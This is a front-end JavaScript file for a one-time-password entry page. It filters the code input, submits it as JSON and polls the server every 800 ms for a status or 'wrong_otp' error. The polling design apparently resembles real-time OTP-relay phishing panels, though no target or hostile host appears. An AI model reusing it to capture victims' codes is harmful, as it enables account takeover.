document.addEventListener('DOMContentLoaded', function () {
    const form = document.querySelector('form[data-real-id="code-window"]');
    const spinner = form.querySelector('[class="loader-overlay"]');


    const otpInput = document.querySelector('input[data-real-id="code"]');

    otpInput.addEventListener('input', () => {
        otpInput.value = otpInput.value.replace(/\D/g, '');
    });

    function showOtpError(errorMessage) {
        document.querySelector('[data-real-id="main-code-error"]').style.display = 'block';
        document.querySelector('[data-real-id="code-local-error"]').style.display = 'block';
        document.querySelector('[data-real-id="main-code-error-text"]').innerText = errorMessage;
    }


    let isPooling = true;

    const handleChangeState = (state) => {
        switch (state) {
            case "pending":
                spinner.style.display = 'flex'
                isPooling = true
                break;
            case "opened":
                spinner.style.display = 'none'
                isPooling = false
                break;

            case "canceled":
                window.history.go(-1)
                break
            default :
                break;
        }
    }

    const handleErrors = (state) => {
        switch (state) {
            case "wrong_otp":
                showOtpError("The OTP you entered is incorrect. Please try again.")
                break;
            default:
                break;
        }
    }

    const getState = async () => {
        const fullPath = window.location.href;
        try {
            const r = await fetch(fullPath + "?format=json")
            const response = await r.json()
            handleErrors(response?.errors)
            handleChangeState(response.status)
        } catch (e) {
            handleChangeState("opened")
        }
    }

    setInterval(() => {
        if (isPooling) {
            getState()
        }
    }, 800)


    form.addEventListener('submit', function (event) {
        event.preventDefault(); // Остановить стандартную отправку формы

        // Собрать данные формы
        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value;
        });

        handleChangeState("pending")
        fetch(form.action, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': form.querySelector('[name=csrfmiddlewaretoken]').value // Передача CSRF токена
            },
            body: JSON.stringify(data)
        })
            .then(res => res.json())
            .then(res => res.status)
    });
});


